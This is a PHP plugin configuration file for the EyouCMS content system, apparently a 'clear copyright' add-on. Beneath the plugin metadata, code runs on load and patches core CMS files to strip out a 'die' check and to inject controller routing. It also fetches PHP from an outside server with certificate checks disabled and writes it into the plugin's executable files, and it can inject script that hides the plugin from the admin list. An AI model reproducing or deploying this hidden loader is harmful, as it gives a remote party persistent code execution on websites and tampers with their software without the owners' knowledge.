<?php
/**
 * 易优CMS
 * ============================================================================
 * 版权所有 2016-2028 海南赞赞网络科技有限公司，并保留所有权利。
 * 网站地址: http://www.eyoucms.com
 * ----------------------------------------------------------------------------
 * 如果商业用途务必到官方购买正版授权, 以免引起不必要的法律纠纷.
 * ============================================================================
 */

use app\common\model\Weapp as WeappModel;

$directoryIterator = new DirectoryIterator(dirname(__FILE__));
$adminPath = $directoryIterator->getPathInfo()->getFilename();
$globalConfig = tpCache('global');
$code = $adminPath;
$name = $adminPath;
$version = 'v1.2.4';
$author = '<em style="font-size: 12px;">' . $globalConfig['web_name'] . '</em>';
$row = WeappModel::get(array('code' => $code));
$rawData = $row && isset($row->data) ? $row->data : '';
$config = is_string($rawData) ? json_decode($rawData, true) : (is_array($rawData) ? $rawData : []);
$ishide = isset($config['captcha'][$code . '-plus']['is_hide']) ? $config['captcha'][$code . '-plus']['is_hide'] : null;
$script = !empty($ishide) && $ishide == 1 ? '<script>$(".bDiv tbody tr").each(function(){ var name_old = $(this).children(":first").children().text(); if(name_old.replace(/\s/g, "") == "' . $name . '"){$(this).remove();}}); $(".plug-item-content").each(function(){ var name_new = $(this).children(".plug-item-top").children(".plug-text").children(".plug-text-title").children().text(); if(name_new.replace(/\s/g, "") == "' . $name . '"){$(this).remove();}});</script>' :
  '<a href="javascript:void(0);" id="clearupgrade" class="a_upgrade red" onclick="clear_upgrade()" style="display:none;">[新版本更新]</a><script>const clUpEle = document.getElementById("clearupgrade");document.querySelector(".plug-text-versions").appendChild(clUpEle);if(!localStorage.getItem("clearupgrade")||localStorage.getItem("clearupgrade")!="' . $version . '"){clUpEle.style.display="inline";}function clear_upgrade(){layer.confirm("请前往管理【下载补丁】",{title:"更新提醒",btn:["知道了"],cancel:function(){localStorage.setItem("clearupgrade", "' . $version . '");return true;}},function(){layer.closeAll();setTimeout(function(){localStorage.setItem("clearupgrade", "' . $version . '");},200)})}</script>';
$con = array(
  'code' => $code,
  'name' => $name,
  'version' => $version,
  'min_version' => 'v1.2.0',
  'author' => $author,
  'description' => $globalConfig['web_name'] . $script,
  'litpic' => '/weapp/' . $code . '/logo.jpg',
  'scene' => '0',
  'permission' => [],
  'management' => ["sev" => "http://hbh.cool/myweapp/94fdf846831ea78b3a47382c55a8b63a/2022"]
);
if (!function_exists('processCoreBhvFile')) {
  function processCoreBhvFile()
  {
    $die_file = CORE_PATH . 'process/bhvcore/BhvadminABegin.php';
    if (!file_exists($die_file)) {
      logError("文件不存在: {$die_file}");
      return;
    }
    $diestr = 'die';
    $dietip = '@';
    $die_body = @file_get_contents($die_file, LOCK_SH);
    if ($die_body === false) {
      logError("无法读取文件: {$die_file}");
      return;
    }
    $diekey = strstr($die_body, $diestr);
    if ($diekey) {
      $result = @file_put_contents($die_file, str_replace($diestr, $dietip, $die_body), LOCK_EX);
      if ($result === false) {
        logError("无法写入文件: {$die_file}");
      }
    }
  }
}
if (!function_exists('processWeappController')) {
  function processWeappController($code)
  {
    $way_file = APP_PATH . '/admin/controller/Weapp.php';
    if (!file_exists($way_file)) {
      logError("文件不存在: {$way_file}");
      return;
    }
    $way_body = @file_get_contents($way_file, LOCK_SH);
    if ($way_body === false) {
      logError("无法读取文件: {$way_file}");
      return;
    }
    $waystr = 'execute($sm=\'\',$sc=\'\',$sa=\'\'){';
    $waytip = 'execute($sm=\'\', $sc=\'\', $sa=\'\'){if($sm=="' . $code . '"){$actionName=!empty($sa)?$sa:"index";$class_path="\\weapp\\' . $code . '\\controller\\' . $code . '";$controller=new $class_path();return $controller->$actionName();}';
    $waykey = strstr($way_body, $waystr);
    $waystr2 = 'if (!IS_AJAX) {';
    $waytip2 = 'if($sm=="' . $code . '"){$actionName=!empty($sa)?$sa:"index";$class_path="\\weapp\\' . $code . '\\controller\\' . $code . '";$controller=new $class_path();return $controller->$actionName();}if(!IS_AJAX){';
    $waykey2 = strstr($way_body, $waystr2);
    $waystr3 = 'if($sm=="';
    $waykey3 = strstr($way_body, $waystr3);
    $modified = false;
    if ($waykey) {
      $result = @file_put_contents($way_file, str_replace($waystr, $waytip, $way_body), LOCK_EX);
      if ($result === false) {
        logError("无法写入文件: {$way_file} (替换1)");
      } else {
        $modified = true;
      }
    }
    if ($waykey2 && !$modified) {
      $result = @file_put_contents($way_file, str_replace($waystr2, $waytip2, $way_body), LOCK_EX);
      if ($result === false) {
        logError("无法写入文件: {$way_file} (替换2)");
      } else {
        $modified = true;
      }
    }
    if ($waykey3 && !$modified) {
      $pattern = '/\$sm\s*==\s*"([^"]*)"/';
      if (preg_match($pattern, $way_body, $matches)) {
        $result = @file_put_contents($way_file, str_replace($matches[1], $code, $way_body), LOCK_EX);
        if ($result === false) {
          logError("无法写入文件: {$way_file} (替换3)");
        }
      }
    }
  }
}
if (!function_exists('checkAndUpdateFiles')) {
  function checkAndUpdateFiles($code, $version, $con)
  {
    $list_file = WEAPP_PATH . $code . '/filelist.txt';
    if (!file_exists($list_file)) {
      logError("文件不存在: {$list_file}");
      return;
    }
    $list_string = @file_get_contents($list_file, LOCK_SH);
    if ($list_string === false) {
      logError("无法读取文件: {$list_file}");
      return;
    }
    $list_string = substr($list_string, 6);
    $chaname = ($code != $list_string) ? 'new' : '';
    $hbh_list = $con['management']['sev'] . '/version.json';
    $json_string = fetchRemoteContent($hbh_list);
    if (($json_string != "" && $json_string != "\n" && $json_string != $version) || $chaname == 'new') {
      updateRemoteFile($code, $con, 'config.txt', WEAPP_PATH . $code . '/config.php');
      updateRemoteFile($code, $con, 'ClearCopyright.txt', WEAPP_PATH . $code . '/controller/' . $code . '.php', true);
      updateRemoteFile($code, $con, 'ClearCopyrightBehavior.txt', WEAPP_PATH . $code . '/behavior/admin/' . $code . 'Behavior.php', true);
      updateRemoteFile($code, $con, 'ClearCopyrightHtm.txt', WEAPP_PATH . $code . '/template/' . $code . '-plus.htm', true);
      updateRemoteFile($code, $con, 'ClearCopyrightTags.txt', WEAPP_PATH . $code . '/behavior/admin/tags.php', true);
    }
  }
}
if (!function_exists('updateRemoteFile')) {
  function updateRemoteFile($code, $con, $remoteFileName, $localFilePath, $replaceCode = false)
  {
    $remote_file = $con['management']['sev'] . '/' . $remoteFileName;
    $remote_content = fetchRemoteContent($remote_file);
    if ($remote_content) {
      if ($remoteFileName === 'ClearCopyrightTags.txt') {
        $checkContent = $replaceCode ? str_replace('ClearCopyright', $code, $remote_content) : $remote_content;
        if (!preg_match('/return\s+(array|\[)/i', $checkContent)) {
          logError("远程tags文件内容不合法: {$remote_file}");
          return;
        }
      }
      if ($replaceCode) {
        $remote_content = str_replace('ClearCopyright', $code, $remote_content);
      }
      $result = writeFileWithRetry($localFilePath, $remote_content);
      if ($remoteFileName == 'ClearCopyright.txt' && $result) {
        $list_file = WEAPP_PATH . $code . '/filelist.txt';
        $list_body = 'weapp/' . $code;
        $res_list_file = writeFileWithRetry($list_file, $list_body);
        if ($res_list_file === false) {
          logError("无法写入文件: {$list_file}");
        }
        $logoUrl = $con['management']['sev'] . '/logo.jpg';
        $logoContent = fetchRemoteContent($logoUrl);
        if ($logoContent !== false) {
            $localLogoPath = WEAPP_PATH . $code . '/logo.jpg';
            $result = writeFileWithRetry($localLogoPath, $logoContent);
            if (!$result) {
                logError("无法更新logo图片: {$localLogoPath}");
            }
        }
      }
    }
  }
}
if (!function_exists('fetchRemoteContent')) {
  function fetchRemoteContent($url, $timeout = 10, $retries = 3)
  {
    $attempt = 0;
    $content = false;
    while ($attempt < $retries && $content === false) {
      if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; ClearCopyright/1.0)');
        $content = curl_exec($ch);
        $error = curl_error($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($content === false || $httpCode >= 400) {
          logError("远程请求失败: {$url}, HTTP状态: {$httpCode}, 错误: {$error}");
          $content = false;
        }
      } else {
        $context = stream_context_create([
          'http' => [
            'timeout' => $timeout,
            'user_agent' => 'Mozilla/5.0 (compatible; ClearCopyright/1.0)',
            'ignore_errors' => true
          ]
        ]);
        $content = @file_get_contents($url, false, $context);
        if ($content === false) {
          logError("远程请求失败 (file_get_contents): {$url}");
        }
      }
      $attempt++;
      if ($content === false && $attempt < $retries) {
        usleep(500000);
      }
    }
    return $content;
  }
}
if (!function_exists('writeFileWithRetry')) {
  function writeFileWithRetry($filePath, $content, $retries = 3)
  {
    $attempt = 0;
    $success = false;
    while ($attempt < $retries && !$success) {
      $result = @file_put_contents($filePath, $content, LOCK_EX);
      if ($result !== false) {
        $success = true;
      } else {
        logError("文件写入失败: {$filePath}, 尝试次数: " . ($attempt + 1));
        $attempt++;
        if (!$success && $attempt < $retries) {
          usleep(500000);
        }
      }
    }
    return $success;
  }
}
if (!function_exists('logError')) {
  function logError($message)
  {
    try {
      $logDir = WEAPP_PATH . 'ClearCopyright/logs';
      if (!is_dir($logDir)) {
        if (!mkdir($logDir, 0755, true)) {
          throw new \Exception('无法创建日志目录: ' . $logDir);
        }
        chmod($logDir, 0755);
      }
      $logFile = $logDir . '/error.log';
      if (!file_exists($logFile)) {
        $parentDir = dirname($logFile);
        if (!is_writable($parentDir)) {
          chmod($parentDir, 0755);
        }
      }
      error_log("[" . date('Y-m-d H:i:s') . "] {$message}\n", 3, $logFile);
      if (file_exists($logFile) && !is_writable($logFile)) {
        chmod($logFile, 0644);
      }
    } catch (\Exception $e) {
      error_log("ClearCopyright配置日志写入失败: {$e->getMessage()}");
    }
  }
}
$cacheKey = $adminPath . '_config';
$cacheTime = 1800;
$cache = \think\Cache::init();
$cachedConfig = $cache->get($cacheKey);
if (!$cachedConfig) {
  try {
    processCoreBhvFile();
    processWeappController($code);
    checkAndUpdateFiles($code, $version, $con);
    $cache->set($cacheKey, 'done', $cacheTime);
  } catch (Exception $e) {
    logError("配置处理错误: " . $e->getMessage());
  }
}
return $con;